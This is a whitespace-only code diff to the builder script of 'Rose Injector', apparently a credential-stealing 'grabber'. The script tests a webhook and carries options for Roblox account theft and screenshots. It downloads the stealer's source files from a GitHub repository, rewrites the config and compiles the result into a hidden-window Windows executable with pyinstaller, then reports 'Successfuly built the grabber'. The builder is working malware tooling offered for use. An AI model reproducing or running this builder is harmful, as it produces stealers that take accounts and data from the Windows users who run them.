@@ -26,7 +26,7 @@ async def test_webhook(webhook_url):
     except Exception as e:
         print(e)
         return 1
-    
+
 class _Builder():    
     def __init__(
         self,
@@ -60,11 +60,11 @@ class _Builder():
         self.is_robloxsteal = is_robloxsteal
         self.is_screenshot = is_screenshot
         self.is_ping = is_ping
-                
+
     def create_dir(self):
         self.path = f"{Path(__file__).resolve().parent}\\{self.dir_name}"
         os.mkdir(self.path)
-        
+
     def make_req(self):
         page = requests.get('https://github.com/DamagingRose/Rose-Injector/tree/main/source').text
         soup = BeautifulSoup(page, 'html.parser')
@@ -73,7 +73,7 @@ class _Builder():
             text = requests.get(f"https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/source/{file}").text
             with open(f"{self.path}\\{file}","w",encoding="utf-8") as f:
                 f.write(str(text))
-                
+
     def edit_config(self):
         with open(f"{self.path}\\config.py","r",encoding="utf-8") as f:
             text = f.read()
@@ -81,27 +81,27 @@ class _Builder():
         print(new)
         with open(f"{self.path}\\config.py", "w", encoding="utf-8") as f:
             f.write(new)
-            
+
         dir_list = os.listdir(self.path)
-        
+
         for file in dir_list:
             with open(f"{self.path}\\{file}", "r", encoding="utf-8") as f:
                 text = f.read()
                 new = text.replace("from configuration", "from config")
-                
+
             with open(f"{self.path}\\{file}", "w", encoding="utf-8") as f:
                 f.write(new)
-                
+
     def compile(self):
         os.system(f'pyinstaller --noconfirm --onefile --windowed  "{self.path}/main.py"')
-        
+
     def move_dir(self): 
         shutil.move("dist\\main.exe", f"{self.dir_name}.exe")
         shutil.rmtree('build')
         shutil.rmtree('dist')
         os.remove("main.spec")
-        
-        
+
+
 
     def run(self):
         try:
@@ -113,7 +113,7 @@ class _Builder():
             ctypes.windll.user32.MessageBoxW(0, "Successfuly built the grabber", "Rose Injector", 0)
         except Exception as e:
             print(e)
-            
+
 if len(sys.argv) > 1:
     print(sys.argv)
     print(sys.argv[1])
